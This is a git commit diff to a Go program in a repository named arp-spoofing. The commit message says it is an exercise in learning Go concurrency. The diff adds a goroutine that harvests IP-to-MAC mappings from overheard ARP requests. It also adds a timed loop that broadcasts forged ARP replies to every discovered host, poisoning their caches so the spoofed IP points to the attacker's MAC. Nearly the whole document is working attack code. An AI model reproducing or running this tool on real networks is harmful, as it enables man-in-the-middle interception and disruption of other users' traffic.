5aaffe4905519c041b41e159b0f44f7a17547abf
HulnotHutu <HulnotHutu2023@outlook.com>
2026-05-25 21:22:39 +0800

    尝试学习 goruntime

--- cmd/exp-passive/main.go
+++ cmd/exp-passive/main.go
@@ -1,21 +1,68 @@
 package main
 
 import (
+	"context"
 	"flag"
 	"fmt"
 	"os"
+	"os/signal"
+	"sync"
+	"time"
 
-	"arp-spoofing/internal/arpapp"
+	"arp-spoofing/internal/app"
+
 	"github.com/mdlayher/arp"
 )
 
+// macTable 存储局域网中发现的 IP -> MAC 映射
+var (
+	mu       sync.Mutex
+	macTable = make(map[string]string)
+)
+
+// captureARP 监听 ARP 请求并记录发送方到 macTable
+func captureARP(ctx context.Context, client *arp.Client, point app.Endpoint) {
+	for {
+		packet, _, err := client.Read()
+		if err != nil {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				fmt.Fprintf(os.Stderr, "read ARP packet: %v\n", err)
+				continue
+			}
+		}
+		if packet.Operation != arp.OperationRequest {
+			continue
+		}
+
+		// 记录发送方到 macTable
+		mu.Lock()
+		macTable[packet.SenderIP.String()] = packet.SenderHardwareAddr.String()
+		mu.Unlock()
+
+		// 命中的目标立即回复
+		if packet.TargetIP == point.IP {
+			fmt.Printf("[>] Caught ARP request for %s from %s / %s\n",
+				point.IP, packet.SenderIP, packet.SenderHardwareAddr)
+			if err := client.Reply(packet, point.MAC, point.IP); err != nil {
+				fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
+				continue
+			}
+			fmt.Printf("[+] Sent ARP reply: %s is at %s\n",
+				point.IP, point.MAC)
+		}
+	}
+}
+
 func run(ifname, spoofedIPStr string) error {
-	iface, myIP, err := arpapp.GetInterface(ifname)
+	iface, myIP, err := app.GetInterface(ifname)
 	if err != nil {
 		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
 	}
 
-	spoofedIP, err := arpapp.ParseIPv4(spoofedIPStr)
+	spoofedIP, err := app.ParseIPv4(spoofedIPStr)
 	if err != nil {
 		return err
 	}
@@ -26,32 +73,55 @@ func run(ifname, spoofedIPStr string) error {
 	}
 	defer client.Close()
 
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer stop()
+
 	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
 	fmt.Printf("[*] Local IP : %s\n", myIP)
 	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)
 
+	// Producer: 后台捕获 ARP 包，记录到 macTable
+	endpoint := app.Endpoint{IP: spoofedIP, MAC: iface.HardwareAddr}
+	go captureARP(ctx, client, endpoint)
+
+	// Consumer: 定时遍历 macTable，向所有已知主机发送 ARP Reply
+	ticker := time.NewTicker(3 * time.Second)
+	defer ticker.Stop()
+
 	for {
-		packet, _, err := client.Read()
-		// 记录
-		if err != nil {
-			return fmt.Errorf("read ARP packet: %w", err)
+		select {
+		case <-ticker.C:
+			mu.Lock()
+			for ip, mac := range macTable {
+				targetMAC, err := app.ParseMAC(mac)
+				if err != nil {
+					continue
+				}
+				targetIP, err := app.ParseIPv4(ip)
+				if err != nil {
+					continue
+				}
+				pkt, err := arp.NewPacket(
+					arp.OperationReply,
+					iface.HardwareAddr,
+					spoofedIP,
+					targetMAC,
+					targetIP,
+				)
+				if err != nil {
+					continue
+				}
+				if err := client.WriteTo(pkt, targetMAC); err != nil {
+					fmt.Fprintf(os.Stderr, "send spoofed reply to %s: %v\n", ip, err)
+				} else {
+					fmt.Printf("[+] Spoofed reply: %s is at %s -> %s\n", spoofedIP, iface.HardwareAddr, ip)
+				}
+			}
+			mu.Unlock()
+		case <-ctx.Done():
+			fmt.Println("\n[*] Exiting")
+			return nil
 		}
-		// need to ARP request
-		if packet.Operation != arp.OperationRequest {
-			continue
-		}
-		// With this goal in mind
-		if packet.TargetIP != spoofedIP {
-			continue
-		}
-
-		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, packet.SenderIP, packet.SenderHardwareAddr)
-
-		if err := client.Reply(packet, iface.HardwareAddr, spoofedIP); err != nil {
-			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
-			continue
-		}
-		fmt.Printf("[+] Sent ARP reply: %s is at %s\n", spoofedIP, iface.HardwareAddr)
 	}
 }
 
